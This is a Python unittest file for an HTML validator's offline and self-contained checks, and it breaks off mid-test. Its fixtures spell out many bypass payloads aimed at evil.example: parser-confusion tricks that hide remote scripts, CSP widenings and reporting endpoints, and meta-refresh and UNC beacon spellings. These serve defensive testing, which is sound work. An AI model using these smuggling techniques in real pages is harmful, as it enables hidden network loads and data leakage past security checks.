from _validate_helpers import *
from checks import resources  # noqa: E402


class NewCheckTests(unittest.TestCase):
    """Coverage for the self-contained-guarantee, embedded-comment schema, duplicate-heading,
    canvas-report-all, and --strict additions."""

    def _body(self, main, *extra):
        return [HANDLED_REGION, EMBEDDED_REGION, comment_ui(), main] + list(extra) + [JS_REGION]

    def _errs_warns(self, content):
        return _validate_text(content)

    # -- self-contained guarantee -------------------------------------------------- #
    def test_external_img_src_errors(self):
        main = MAIN.replace("<p>content</p>", '<p>content</p>\n  <img src="https://example.com/x.png" alt="x">')
        errors, _ = self._errs_warns(build(body=self._body(main)))
        self.assertTrue(any("loads over the network" in e for e in errors), errors)

    def test_local_path_img_warns_not_errors(self):
        main = MAIN.replace("<p>content</p>", '<p>content</p>\n  <img src="images/x.png" alt="x">')
        errors, warnings = self._errs_warns(build(body=self._body(main)))
        self.assertEqual(errors, [], errors)
        self.assertTrue(any("local path" in w for w in warnings), warnings)

    def test_data_uri_img_is_clean(self):
        main = MAIN.replace("<p>content</p>", '<p>content</p>\n  <img src="data:image/png;base64,AAAA" alt="x">')
        errors, warnings = self._errs_warns(build(body=self._body(main)))
        self.assertEqual(errors, [], errors)
        self.assertEqual(warnings, [], warnings)

    def test_external_script_src_errors(self):
        errors, _ = self._errs_warns(build(body=self._body(MAIN, '<script src="https://evil.cdn/x.js"></script>')))
        self.assertTrue(any("self-contained guarantee" in e for e in errors), errors)

    def test_a_script_hidden_behind_a_bogus_cdata_comment_still_errors(self):
        # CMH-VAL-21: in HTML content `<![CDATA[` is a bogus comment ending at the first `>`,
        # so this <script> is LIVE and fetches remote code. The tag lookup this check reads used
        # to be a bare HTMLParser, which swallowed the whole marked section and reported no
        # script at all, so the document passed the self-contained guarantee.
        smuggled = '<![CDATA[><script src="//evil.example/x.js"></script>]]>'
        errors, _ = self._errs_warns(build(body=self._body(MAIN, smuggled)))
        self.assertTrue(any("self-contained guarantee" in e and "evil.example" in e
                            for e in errors), errors)

    def test_a_resource_hidden_inside_a_foreign_script_or_style_still_errors(self):
        # CMH-VAL-21: NOTHING is raw text inside foreign content. HTML5 takes a `<script>` /
        # `<style>` start tag in the SVG namespace through "any other start tag", which inserts a
        # foreign element and leaves the tokenizer in the DATA state - so this `<img>` is a real
        # element a browser builds (`img` breaks out of foreign content and is inserted in the
        # HTML namespace) and FETCHES, as Chromium confirms. Reading the body as raw text left it
        # out of both lookups this check reads, so the document passed the self-contained
        # guarantee while still making a network request.
        for elem in ("script", "style"):
            with self.subTest(elem=elem):
                smuggled = ('<svg><%s><img src="//evil.example/x.png"></%s></svg>'
                            % (elem, elem))
                errors, _ = self._errs_warns(build(body=self._body(MAIN, smuggled)))
                self.assertTrue(any("evil.example" in e for e in errors), errors)

    def test_chartjs_cdn_script_is_exempt_from_self_contained_error(self):
        script = '<script src="https://cdn.jsdelivr.net/npm/chart.js@4.4.0/dist/chart.umd.min.js"></script>'
        errors, _ = self._errs_warns(build(body=self._body(MAIN, script)))
        self.assertFalse(any("self-contained guarantee" in e for e in errors), errors)

    def test_offline_mode_rejects_chartjs_cdn_script(self):
        script = '<script src="https://cdn.jsdelivr.net/npm/chart.js@4.4.0/dist/chart.umd.min.js"></script>'
        doc = with_offline_mode(build(body=self._body(MAIN, script)))
        errors, _ = self._errs_warns(doc)
        self.assertTrue(any("offline mode" in e and "Chart.js" in e for e in errors), errors)

    def test_offline_mode_rejects_network_resources_and_css_imports(self):
        css = CSS_REGION.replace(
            ":root { --cp-bg: #ffffff; --cp-text: #000000; }",
            '@import "https://cdn.example.com/theme.css";\n'
            ":root { --cp-bg: #ffffff; --cp-text: #000000; }")
        main = MAIN.replace(
            "<p>content</p>",
            '<img src="https://example.com/x.png" alt="x">\n'
            '<iframe src="https://example.com/f.html"></iframe>\n'
            '<video poster="https://example.com/poster.png"><track src="https://example.com/c.vtt"></video>')
        extras = [
            '<link rel="stylesheet" href="https://example.com/app.css">',
            '<script src="https://example.com/app.js"></script>',
        ]
        doc = with_offline_mode(build(css=css, body=self._body(main, *extras)))
        errors, _ = self._errs_warns(doc)
        for needle in ("<img", "<iframe", "<video", "<track", "<link", "<script", "@import"):
            self.assertTrue(any("offline mode" in e and needle in e for e in errors),
                            "expected offline error for %s, got %r" % (needle, errors))

    def test_offline_mode_accepts_inlined_data_resources(self):
        main = MAIN.replace(
            "<p>content</p>",
            '<img src="data:image/png;base64,AAAA" alt="x">\n'
            '<video poster="data:image/png;base64,AAAA"></video>')
        doc = with_offline_mode(build(body=self._body(main)))
        errors, warnings = self._errs_warns(doc)
        self.assertEqual(errors, [], errors)
        self.assertEqual(warnings, [], warnings)

    def test_offline_mode_requires_restrictive_csp(self):
        errors, _ = self._errs_warns(with_offline_mode(build(), csp=False))
        self.assertTrue(any("Content-Security-Policy" in e for e in errors), errors)
        weak = with_offline_mode(build()).replace("form-action 'none'; ", "", 1)
        errors, _ = self._errs_warns(weak)
        self.assertTrue(any("form-action 'none'" in e for e in errors), errors)

    def test_offline_mode_rejects_a_widened_fetch_directive(self):
        # Exclusivity used to be enforced only for the directives whose required token is `'none'`,
        # so a hand-authored policy could add a HOST SOURCE to the four FETCH directives and still
        # pass --strict. That is the premise the CSS and attribute network-literal gates lean on
        # (CMH-VAL-08 criterion 3: "the offline CSP closes those fetch channels"), so while it went
        # unenforced a permissive policy plus a slashless reference was arbitrary remote code in a
        # file certified as offline-clean.
        for directive, required in (("script-src", "'unsafe-inline'"),
                                    ("style-src", "'unsafe-inline'"),
                                    ("img-src", "data:"),
                                    ("font-src", "data:")):
            pair = "%s %s" % (directive, required)
            doc = with_offline_mode(build()).replace(
                pair, pair + " https://evil.example", 1)
            errors, _ = self._errs_warns(doc)
            self.assertTrue(any(directive in e and "evil.example" in e for e in errors),
                            "%s: %r" % (directive, errors))

    def test_offline_mode_rejects_a_fetch_source_that_grants_a_network_load(self):
        # None of these is a host source, and each still reaches the network: `'self'` on a
        # `file://` document is unspecified (an opaque origin) and has historically meant the
        # containing directory, a HASH source matches an EXTERNAL script carrying `integrity` in
        # CSP3, and `'strict-dynamic'` (with the nonce that usually accompanies it) grants whatever
        # an already-trusted script loads. A scheme or wildcard source is a network source outright.
        for token in ("'self'", "'strict-dynamic'", "'sha256-YWJj'", "'nonce-YWJj'", "https:", "*"):
            doc = with_offline_mode(build()).replace(
                "script-src 'unsafe-inline'", "script-src 'unsafe-inline' %s" % token, 1)
            errors, _ = self._errs_warns(doc)
            self.assertTrue(any("script-src" in e and token in e for e in errors),
                            "%s: %r" % (token, errors))

    def test_offline_mode_accepts_a_policy_whose_extra_sources_cannot_fetch(self):
        # The rule is an ALLOWLIST of source expressions that provably cannot fetch, not an exact
        # match on the exporter's own string, so a legitimate hand-authored policy is not rejected
        # for no reason. Source expressions are ASCII case-insensitive, which `DATA:` pins.
        doc = with_offline_mode(build())
        doc = doc.replace("script-src 'unsafe-inline'",
                          "script-src 'unsafe-inline' 'unsafe-eval' 'wasm-unsafe-eval'", 1)
        doc = doc.replace("style-src 'unsafe-inline'",
                          "style-src 'unsafe-inline' 'unsafe-hashes' 'report-sample'", 1)
        doc = doc.replace("img-src data:", "img-src DATA: blob:", 1)
        doc = doc.replace("font-src data:", "font-src data: blob:", 1)
        errors, warnings = self._errs_warns(doc)
        self.assertEqual(errors, [], errors)
        self.assertEqual(warnings, [], warnings)

    def test_a_csp_meta_a_browser_never_applies_does_not_satisfy_the_offline_policy(self):
        # A `<template>`'s contents live in an inert DocumentFragment, and the HTML pragma
        # directives are processed only for a meta the head holds - so neither placement is ever
        # the document's policy, and reading either suppressed the missing-CSP error outright.
        parked = ('<template><meta http-equiv="Content-Security-Policy" content="%s"></template>\n'
                  % OFFLINE_CSP)
        doc = with_offline_mode(build(body=self._body(MAIN)), csp=False)
        errors, _ = self._errs_warns(doc.replace("<head>\n", "<head>\n" + parked, 1))
        self.assertTrue(any("missing Content-Security-Policy" in e for e in errors), errors)
        in_body = '<meta http-equiv="Content-Security-Policy" content="%s">' % OFFLINE_CSP
        errors, _ = self._errs_warns(
            with_offline_mode(build(body=self._body(MAIN, in_body)), csp=False))
        self.assertTrue(any("missing Content-Security-Policy" in e for e in errors), errors)

    def test_a_repeated_csp_directive_is_read_the_way_a_browser_reads_it(self):
        # A browser IGNORES every occurrence of a directive after the first, so the FIRST copy is
        # the policy. Reading the LAST one (a plain dict build) let a permissive first copy be
        # masked by a strict repeat written after it.
        doc = with_offline_mode(build()).replace(
            "script-src 'unsafe-inline'",
            "script-src 'unsafe-inline' https://evil.example; script-src 'unsafe-inline'", 1)
        errors, _ = self._errs_warns(doc)
        self.assertTrue(any("script-src" in e and "evil.example" in e for e in errors), errors)

    def test_offline_mode_rejects_a_directive_the_offline_contract_does_not_require(self):
        # The required set is not the whole policy. CSP3's more-specific fetch directives OVERRIDE
        # the ones this contract pins when they are present (`script-src-elem` beats `script-src`
        # for a <script src> load, `style-src-elem` beats `style-src`), and `worker-src` /
        # `media-src` / `manifest-src` are safe today only because they are ABSENT and fall back to
        # `default-src 'none'`. A reporting endpoint is worse still: it is live network egress out
        # of a document that promises none, carrying whatever the violation report names.
        for extra in ("script-src-elem https://evil.example",
                      "style-src-elem https://evil.example",
                      "worker-src https://evil.example",
                      "child-src https://evil.example",
                      "prefetch-src https://evil.example",
                      "media-src https://evil.example",
                      "manifest-src https://evil.example",
                      "report-uri https://evil.example/collect",
                      "report-to https://evil.example/collect"):
            name = extra.split()[0]
            doc = with_offline_mode(build()).replace(
                "script-src 'unsafe-inline'", "script-src 'unsafe-inline'; " + extra, 1)
            errors, _ = self._errs_warns(doc)
            self.assertTrue(any(name in e for e in errors), "%s: %r" % (name, errors))

    def test_offline_mode_accepts_an_extra_directive_that_can_only_tighten(self):
        # The rule is "an extra directive may only tighten", not "no extra directive": a source
        # list of exactly 'none', or none at all, cannot widen anything, and the directives that
        # carry no source list at all (a sink group, a policy name, a sandbox flag) are named
        # rather than run through a source-list test their grammar does not have.
        doc = with_offline_mode(build()).replace(
            "script-src 'unsafe-inline'",
            "script-src 'unsafe-inline'; worker-src 'none'; upgrade-insecure-requests; "
            "require-trusted-types-for 'script'; trusted-types cmh", 1)
        errors, warnings = self._errs_warns(doc)
        self.assertEqual(errors, [], errors)
        self.assertEqual(warnings, [], warnings)

    def test_offline_mode_accepts_an_empty_source_list_where_none_is_required(self):
        # A directive with NO sources matches nothing, so it is exactly as strict as `'none'`.
        # Reporting it as missing its required token would reject a browser-equivalent policy.
        doc = with_offline_mode(build()).replace("connect-src 'none'", "connect-src", 1)
        errors, warnings = self._errs_warns(doc)
        self.assertEqual(errors, [], errors)
        self.assertEqual(warnings, [], warnings)

    def test_a_head_end_tag_that_opens_the_body_moves_the_csp_meta_out_of_the_head(self):
        # "in head" and "after head" both treat an end tag named body, html or br as "anything
        # else": the head is popped and a <body> is inserted, so the policy <meta> written after
        # one is a BODY child whose pragma never runs. Tracking the boundary on start tags and
        # character data alone recorded it as the document's policy.
        for closer in ("</body>", "</html>", "</br>"):
            doc = with_offline_mode(build()).replace("<head>\n", "<head>\n" + closer + "\n", 1)
            errors, _ = self._errs_warns(doc)
            self.assertTrue(any("missing Content-Security-Policy" in e for e in errors),
                            "%s: %r" % (closer, errors))
        # The control, and the reason the list must not be widened: every OTHER end tag in those
        # two modes is ignored, so a policy written after one is still a head child.
        doc = with_offline_mode(build()).replace("<head>\n", "<head>\n</div>\n", 1)
        errors, _ = self._errs_warns(doc)
        self.assertEqual(errors, [], errors)

    def test_offline_mode_accepts_a_csp_meta_a_non_fetching_element_precedes(self):
        # Lateness is decided by CAPABILITY, not by tag name: a `rel=canonical` link loads nothing
        # and a `type=application/json` block neither runs nor loads, so a policy written after one
        # still covers the whole document. Rejecting it would be a false rejection carrying a
        # message that claims something the element cannot do.
        doc = with_offline_mode(build()).replace(
            "<head>\n",
            '<head>\n<link rel="canonical" href="#top">\n'
            '<script type="application/json" id="cmhDemoData">{"a":1}</script>\n', 1)
        errors, warnings = self._errs_warns(doc)
        self.assertEqual(errors, [], errors)
        self.assertEqual(warnings, [], warnings)

    def test_offline_mode_reads_the_policy_the_way_csp_tokenizes_it(self):
        # CSP splits a policy on ASCII whitespace only, so a NON-ASCII space between a directive
        # name and its value leaves a browser with one unrecognized directive name and NO policy at
        # all. Python's `str.split()` is Unicode-aware and read it as a well-formed directive, so
        # the whole policy could be neutralized with one character per directive while the gate
        # reported it complete.
        doc = with_offline_mode(build()).replace(
            "default-src 'none'", "default-src\u00a0'none'", 1)
        errors, _ = self._errs_warns(doc)
        self.assertTrue(any("default-src" in e for e in errors), errors)

    def test_offline_mode_reads_a_late_csp_predecessor_link_through_the_shared_rel_set(self):
        # The CSP-lateness rule asks the SAME "does this <link> fetch?" question the offline
        # resource gate and the export strip ask, through the shared `FETCHING_LINK_RELS` /
        # `link_rel_tokens` pair - so it has to move with them. A relation only one of the three
        # readers knows (`apple-touch-icon-precomposed` was exactly that) would leave a policy
        # written after a real fetch certified as covering the whole document; and a separator HTML
        # does NOT tokenize on (U+001C, which Python's argument-less `str.split()` does) would make
        # this reader see a relation a browser never does and reject a policy that is fine.
        fetching = with_offline_mode(build()).replace(
            "<head>\n", '<head>\n<link rel="apple-touch-icon-precomposed" href="icon.png">\n', 1)
        errors, _ = self._errs_warns(fetching)
        self.assertTrue(any("Content-Security-Policy" in e for e in errors), errors)
        inert = with_offline_mode(build()).replace(
            "<head>\n", '<head>\n<link rel="stylesheet\u001cx" href="local.css">\n', 1)
        errors, warnings = self._errs_warns(inert)
        self.assertEqual(errors, [], errors)
        self.assertEqual(warnings, [], warnings)

    def test_offline_mode_rejects_a_csp_meta_a_fetching_element_already_preceded(self):
        # A meta-delivered policy is NOT retroactive: it governs only what the parser reaches after
        # it. A fetch or an execution written above it happens with no policy in force, which is
        # exactly the channel the slashless attribute spellings ride.
        doc = with_offline_mode(build()).replace(
            "<head>\n", "<head>\n<script>void 0;</script>\n", 1)
        errors, _ = self._errs_warns(doc)
        self.assertTrue(any("Content-Security-Policy" in e for e in errors), errors)

    def test_offline_mode_accepts_a_csp_meta_only_inert_elements_precede(self):
        # The control for the rule above: a charset meta, a title and a base cannot fetch or
        # execute, so a policy written after them still covers the whole document.
        doc = with_offline_mode(build()).replace(
            "<head>\n", '<head>\n<meta charset="utf-8">\n<title>t</title>\n<base href="./">\n', 1)
        errors, warnings = self._errs_warns(doc)
        self.assertEqual(errors, [], errors)
        self.assertEqual(warnings, [], warnings)

    def test_non_whitespace_head_text_moves_the_csp_meta_out_of_the_head(self):
        # A non-whitespace character token in "in head" pops the head and opens the body, so the
        # <meta> written after it is a child of BODY - and the HTML pragma directives return early
        # for a meta that is not a head child. Tracking the head on start tags alone recorded it.
        doc = with_offline_mode(build()).replace("<head>\n", "<head>\nZZZ\n", 1)
        errors, _ = self._errs_warns(doc)
        self.assertTrue(any("missing Content-Security-Policy" in e for e in errors), errors)

    def test_a_csp_meta_written_after_the_head_is_still_the_documents_policy(self):
        # The other direction, and the reason `</head>` must NOT end this view: the "after head"
        # insertion mode re-pushes the head element for a base/link/meta/script/style/title/template
        # start tag, so this meta really is a head child and a browser really does apply it.
        # Dropping it would report a document that HAS a policy as having none. Here it is reported
        # only for being LATE (this fixture's own <link>, <script> and <style> precede it), which is
        # itself the proof it was read as the document's policy rather than discarded.
        meta = '<meta http-equiv="Content-Security-Policy" content="%s">\n' % OFFLINE_CSP
        doc = with_offline_mode(build(), csp=False).replace("</head>\n", "</head>\n" + meta, 1)
        errors, _ = self._errs_warns(doc)
        self.assertFalse(any("missing Content-Security-Policy" in e for e in errors), errors)
        self.assertTrue(any("not retroactive" in e for e in errors), errors)

    def test_any_applied_csp_policy_that_meets_the_contract_clears_the_check(self):
        # CSP enforcement across several policies is CONJUNCTIVE - a resource must be allowed by
        # every one - so a compliant policy beside a permissive one still bounds the document.
        weak = '<meta http-equiv="Content-Security-Policy" content="default-src \'none\'">\n'
        doc = with_offline_mode(build()).replace("<head>\n", "<head>\n" + weak, 1)
        errors, _ = self._errs_warns(doc)
        self.assertEqual(errors, [], errors)
        # ...and when NO applied policy meets it, the FIRST one's shortfalls are what is reported.
        doc = with_offline_mode(build(), csp=False).replace("<head>\n", "<head>\n" + weak, 1)
        errors, _ = self._errs_warns(doc)
        self.assertTrue(any("must include script-src 'unsafe-inline'" in e for e in errors), errors)

    def test_offline_mode_rejects_network_form_actions(self):
        main = MAIN.replace(
            "<p>content</p>",
            '<form action="https://example.com/post"><button formaction="//example.com/button">Send</button>'
            '<input formaction="https://example.com/input" value="Send"></form>')
        errors, _ = self._errs_warns(with_offline_mode(build(body=self._body(main))))
        for needle in ("<form action", "<button formaction", "<input formaction"):
            self.assertTrue(any("offline mode" in e and needle in e for e in errors),
                            "expected offline form error for %s, got %r" % (needle, errors))

    def test_offline_mode_rejects_network_meta_refresh(self):
        doc = with_offline_mode(build(body=self._body(MAIN, '<meta http-equiv="refresh" content="0; url=https://example.com/out">')))
        errors, _ = self._errs_warns(doc)
        self.assertTrue(any("offline mode" in e and "meta refresh" in e for e in errors), errors)
        # The BEACON wording specifically, not just any refresh rejection: every refresh is now an
        # error, so without this the network branch could collapse into the generic message and the
        # target parser CMH-VAL-08 keeps would stop being exercised in the positive direction.
        self.assertTrue(any("points at a network URL" in e for e in errors), errors)

    def test_offline_mode_rejects_a_meta_refresh_that_omits_the_url_keyword(self):
        # The `url=` keyword is OPTIONAL in the HTML shared declarative refresh steps: once the
        # time and its `;`/`,`/whitespace separator are consumed, anything that is not `url` is
        # taken as the URL itself. So dropping four characters was a cheaper bypass than the
        # scheme-only spelling this gate was widened for.
        for content in ("0;https://evil.example",
                        "0;https:evil.example",
                        "0,https://evil.example",
                        "0 https://evil.example",
                        "0;'https:evil.example'",
                        "0;url= https:evil.example",
                        "0;url=' https://evil.example'",
                        "0.5;https://evil.example"):
            doc = with_offline_mode(build(body=self._body(
                MAIN, '<meta http-equiv="refresh" content="%s">' % content)))
            errors, _ = self._errs_warns(doc)
            # The BEACON wording, not merely "some refresh error": since every refresh is rejected,
            # a generic-message assertion would pass even if the target parser stopped extracting
            # the URL at all, which is exactly what this test exists to pin.
            self.assertTrue(any("points at a network URL" in e for e in errors),
                            "expected an offline meta refresh beacon for %r, got %r" % (content, errors))

    def test_offline_mode_rejects_a_meta_refresh_with_a_remote_file_authority(self):
        # A special scheme's relative-slash state treats `\` like `/`, so on a `file://` document
        # `\\host` resolves to `file://host/...` - a UNC fetch off the machine, and a top-level
        # navigation the CSP cannot stop either. The explicit `file:` spelling of the same host
        # has to count for the same reason.
        for content in ("0;url=\\\\evil.example/out",
                        "0;url=/\\evil.example/out",
                        "0;url=file://evil.example/share/x.html",
                        "0;url=file:\\\\evil.example\\share\\x.html",
                        "0;file://evil.example/share/x.html"):
            doc = with_offline_mode(build(body=self._body(
                MAIN, '<meta http-equiv="refresh" content="%s">' % content)))
            errors, _ = self._errs_warns(doc)
            self.assertTrue(any("points at a network URL" in e for e in errors),
                            "expected an offline meta refresh beacon for %r, got %r" % (content, errors))

    def test_offline_mode_rejects_a_scheme_only_meta_refresh(self):
        # A browser resolves `https:evil.example` against a file:// document exactly as it
        # resolves `https://evil.example`, and a meta refresh is a TOP-LEVEL NAVIGATION, which no
        # meta-delivered CSP can restrict - so while the gate required the slashes, the whole
        # channel was open to a one-token spelling change.
        for content in ("0;url=https:evil.example",
                        "0; url='http:evil.example/out'",
                        "0;URL=HTTPS:evil.example"):
            doc = with_offline_mode(build(body=self._body(
                MAIN, '<meta http-equiv="refresh" content="%s">' % content)))
            errors, _ = self._errs_warns(doc)
            self.assertTrue(any("points at a network URL" in e for e in errors),
                            "expected an offline meta refresh beacon for %r, got %r" % (content, errors))

    def test_offline_mode_reads_a_meta_refresh_target_with_the_shared_network_predicate(self):
        # Every refresh is rejected, so what is left to get wrong is WHICH message the rejection
        # carries - and the bespoke pattern that decided it drifted from the shared
        # `is_network_url` every other egress gate reads, in BOTH directions. The
        # four-or-more-separator `file:` spelling is an EMPTY-host file URL whose UNC-shaped path a
        # real Chromium on Windows was measured resolving off the machine - the platform, not the
        # URL parser, opens that authority - so the attribute gate counts it and the bespoke arms,
        # which read exactly two separators, called it local. In the other direction a Windows DRIVE
        # LETTER is turned into a path by the file-host state, so `file://C:/x.html` reaches no host
        # at all and must not be named a beacon.
        for content in ("0;url=file:////evil.example/x.html",
                        "0;url=file://///evil.example/x.html"):
            with self.subTest(content=content):
                doc = with_offline_mode(build(body=self._body(
                    MAIN, '<meta http-equiv="refresh" content="%s">' % content)))
                errors, _ = self._errs_warns(doc)
                self.assertTrue(any("points at a network URL" in e for e in errors),
                                "expected the beacon wording for %r, got %r" % (content, errors))
        # A slash run of THREE or more is where the shared predicate deliberately over-reports, and
        # inheriting that is the point of the change rather than an accident of it. What such a
        # reference resolves to depends on the BASE: from a document served over http/https (the
        # marketplace site publishes these reports that way) the special-authority states ignore the
        # run and `///host` is that host, while from a `file:` base the file-host state takes an
        # empty host and it is a local path. The `/{2,}` arm counts both, the fail-CLOSED reading a
        # gate whose miss is a beacon should make - and the cost here is only wording, since the
        # refresh is rejected either way. The backslash spellings normalize into the same run.
        for content in ("0;url=///evil.example/out", "0;url=\\//evil.example/out"):
            with self.subTest(content=content):
                doc = with_offline_mode(build(body=self._body(
                    MAIN, '<meta http-equiv="refresh" content="%s">' % content)))
                errors, _ = self._errs_warns(doc)
                self.assertTrue(any("points at a network URL" in e for e in errors),
                                "expected the beacon wording for %r, got %r" % (content, errors))
        for content in ("0;url=file://C:/x.html", "0;url=file://c|/x.html"):
            with self.subTest(content=content):
                doc = with_offline_mode(build(body=self._body(
                    MAIN, '<meta http-equiv="refresh" content="%s">' % content)))
                errors, _ = self._errs_warns(doc)
                self.assertFalse(any("points at a network URL" in e for e in errors),
                                 "unexpected beacon wording for %r: %r" % (content, errors))
                self.assertTrue(any("whatever its target" in e for e in errors),
                                "expected the generic wording for %r: %r" % (content, errors))

    def test_offline_mode_rejects_a_local_meta_refresh_too(self):
        # The exporter removes EVERY `meta[http-equiv=refresh]` whatever its target, so a file
        # carrying a relative one is a file an export would change - and a refresh is a TOP-LEVEL
        # NAVIGATION no meta-delivered CSP can restrict, which an injected `<base href>` rebases
        # onto the network. The gate errored only on a network target, so both sides disagreed.
        for content in ("5;url=./x.html", "0;url=#a", "30", "0;url=data:text/html,x"):
            with self.subTest(content=content):
                doc = with_offline_mode(build(body=self._body(
                    MAIN, '<meta http-equiv="refresh" content="%s">' % content)))
                errors, _ = self._errs_warns(doc)
                # The GENERIC branch by its own wording, so an inverted branch selection (or a
                # collapse of the two messages into one) cannot leave this green.
                self.assertTrue(any("whatever its target" in e for e in errors), (content, errors))

    def test_offline_mode_names_a_network_meta_refresh_target_only_when_there_is_one(self):
        # Every refresh is rejected (above), but the two messages must stay distinguishable: only
        # a target a browser resolves to a network host earns the beacon wording. These are the
        # false-positive controls for the target parser: each is a value a browser either resolves
        # INSIDE the file or does not treat as a refresh at all. `url=https:...` with no time is
        # not a refresh (the algorithm returns when the time is empty), the quoted value is
        # TRUNCATED at its closing quote so the `url=https:` inside it is ordinary path text, and
        # the keyword's `=` may be preceded only by ASCII whitespace - an NBSP makes the whole
        # tail a relative reference.
        for content in ("5;url=./x.html",
                        "0;url=#a",
                        "0;url=sub/page.html",
                        "30",
                        "url=https:evil.example",
                        "0;url='./x;url=https:evil.example'",
                        "0;url\u00a0=https:evil.example",
                        "0;url=data:text/html,x",
                        "0;url=./x.html?url=https://evil.example",
                        "0;url=foo.html;url=https:evil.example",
                        "0;remark url=https:evil.example",
                        "0;url=https:",
                        "0;url=http:",
                        "0;url=https://",
                        "0;url=\\x.html",
                        "0;urhttps://evil.example",
                        "0;urlhttps://evil.example",
                        "0;u'https://evil.example'",
                        "0;url https://evil.example",
                        "0;url=https: ",
                        "0;url=file:///C:/x.html",
                        "0;url=file://localhost/x.html",
                        "0;url=file:notes.html",
                        "0;url=http\u017f://evil.example"):
            doc = with_offline_mode(build(body=self._body(
                MAIN, '<meta http-equiv="refresh" content="%s">' % content)))
            errors, _ = self._errs_warns(doc)
            self.assertFalse(any("points at a network URL" in e for e in errors),
                             "unexpected network meta refresh error for %r: %r" % (content, errors))
            self.assertTrue(any("meta refresh" in e for e in errors),
                            "expected the generic meta refresh error for %r: %r" % (content, errors))

    def test_offline_mode_rejects_an_iframe_srcdoc(self):
        # A `srcdoc` carries a whole nested DOCUMENT as an attribute VALUE, so neither side of the
        # offline contract could see inside it: the strip cleared only `src` and its element walk
        # never descends into a string, and this gate's tokenizer reads the nested markup as
        # attribute text rather than tags. An inline handler, a meta refresh, or a network loader
        # therefore rode through an export AND past `--strict`. The direction both sides now take
        # is that an offline document may not carry one at all.
        for markup in ('<iframe srcdoc="&lt;img src=//evil.example/x.png&gt;"></iframe>',
                       '<iframe srcdoc="&lt;body onload=location=String.fromCharCode(47)&gt;"></iframe>',
                       '<iframe srcdoc=""></iframe>',
                       '<iframe srcdoc></iframe>'):
            with self.subTest(markup=markup):
                doc = with_offline_mode(build(body=self._body(MAIN, markup)))
                errors, _ = self._errs_warns(doc)
                self.assertTrue(any("offline mode" in e and "srcdoc" in e for e in errors),
                                "expected an offline srcdoc error for %r, got %r" % (markup, errors))

    def test_offline_mode_rejects_an_iframe_srcdoc_wherever_it_is_parked(self):
        # The same shapes every other offline rule is held to: `<template>` content the export
        # walks into, a `<noscript>` fallback the reader who cannot run the layer really parses,
        # and a self-closed foreign element the exporter's DOM walk reaches.
        for markup in ('<template><iframe srcdoc="&lt;p&gt;x&lt;/p&gt;"></iframe></template>',
                       '<noscript><iframe srcdoc="&lt;p&gt;x&lt;/p&gt;"></iframe></noscript>',
                       '<svg><iframe srcdoc="&lt;p&gt;x&lt;/p&gt;"/></svg>'):
            with self.subTest(markup=markup):
                doc = with_offline_mode(build(body=self._body(MAIN, markup)))
                errors, _ = self._errs_warns(doc)
                self.assertTrue(any("offline mode" in e and "srcdoc" in e for e in errors),
                                "expected an offline srcdoc error for %r, got %r" % (markup, errors))

    def test_offline_mode_accepts_an_iframe_without_a_srcdoc(self):
        # The control: the rule is about the nested document, not about the element. A legitimate
        # offline document that frames nothing (or frames a local file) is untouched, and so is an
        # ordinary `srcdoc`-free document.
        for markup in ("<iframe></iframe>", '<iframe src="local.html" title="t"></iframe>'):
            with self.subTest(markup=markup):
                doc = with_offline_mode(build(body=self._body(MAIN, markup)))
                errors, warnings = self._errs_warns(doc)
                self.assertEqual(errors, [], errors)
                self.assertEqual(warnings, [], warnings)

    def test_a_srcdoc_is_left_alone_outside_offline_mode(self):
        # Shareable mode makes no zero-network promise and its export runs no offline strip, so
        # the rule stays scoped to the mode whose contract it belongs to.
        markup = '<iframe srcdoc="&lt;p&gt;x&lt;/p&gt;"></iframe>'
        errors, _ = self._errs_warns(build(body=self._body(MAIN, markup)))
        self.assertFalse(any("srcdoc" in e for e in errors), errors)

    def test_offline_mode_rejects_a_permissive_element_referrer_policy(self):
        # CMH-OFFLINE-10. The export removes every `referrerpolicy` attribute, because a
        # per-element policy overrides the document one for that request - so a permissive one
        # planted on an anchor defeats the `no-referrer` meta beside it and hands the document's
        # own URL to whatever the reader clicks. The gate had no matching rule at all, so a
        # hand-authored offline document carrying one validated clean.
        for markup in ('<a href="local.html" referrerpolicy="unsafe-url">x</a>',
                       '<a href="local.html" REFERRERPOLICY="Unsafe-URL">x</a>',
                       '<img src="local.png" alt="x" referrerpolicy="origin">',
                       '<iframe src="local.html" referrerpolicy="no-referrer-when-downgrade"></iframe>',
                       '<link rel="icon" href="local.png" referrerpolicy="unsafe-url">',
                       '<template><a href="local.html" referrerpolicy="unsafe-url">x</a></template>',
                       '<noscript><a href="local.html" referrerpolicy="unsafe-url">x</a></noscript>',
                       '<svg><a href="local.html" referrerpolicy="unsafe-url"/></svg>',
                       '<script src="local.js" referrerpolicy="unsafe-url"></script>',
                       '<map name="m"><area href="local.html" referrerpolicy="unsafe-url"></map>'):
            with self.subTest(markup=markup):
                doc = with_offline_mode(build(body=self._body(MAIN, markup)))
                errors, _ = self._errs_warns(doc)
                self.assertTrue(any("offline mode" in e and "referrerpolicy" in e for e in errors),
                                "expected an offline referrerpolicy error for %r, got %r"
                                % (markup, errors))

    def test_offline_mode_accepts_an_element_policy_a_browser_does_not_honour(self):
        # The controls the rule is measured by, every one of them checked in a real Chromium
        # (`element.referrerPolicy` is the empty string - the invalid value state - for all four of
        # the rejected spellings below, so each sets NO policy and the document's own stays in
        # force). `referrerpolicy` is an ENUMERATED attribute: it is not trimmed, and the legacy
        # meta aliases are not keywords for it. A policy that restates `no-referrer` weakens
        # nothing either, and neither does the attribute on an element that issues no request - a
        # `<div>`, and the three SVG-only fetchers SVG2 lists the attribute on but a real Chromium
        # exposes no `referrerPolicy` for at all (`image`, `use`, `feImage` - measured, the IDL
        # attribute is absent), so nothing there honours it. Nor does one on an `a`/`area` whose
        # `rel` carries `noreferrer` (HTML sets that navigation's referrer to
        # no-referrer whatever the attribute says). The far more common control is last: a
        # document that carries no such attribute at all, which is what the export itself emits.
        for markup in ('<a href="local.html" referrerpolicy="no-referrer">x</a>',
                       '<a href="local.html" referrerpolicy="No-Referrer">x</a>',
                       '<a href="local.html" referrerpolicy="always">x</a>',
                       '<a href="local.html" referrerpolicy=" unsafe-url ">x</a>',
                       '<a href="local.html" referrerpolicy="">x</a>',
                       '<a href="local.html" referrerpolicy="bogus-policy">x</a>',
                       '<a href="local.html" rel="noreferrer" referrerpolicy="unsafe-url">x</a>',
                       '<a href="local.html" rel="NOREFERRER noopener" referrerpolicy="unsafe-url">x</a>',
                       '<map name="m"><area href="local.html" rel="noreferrer" referrerpolicy="unsafe-url"></map>',
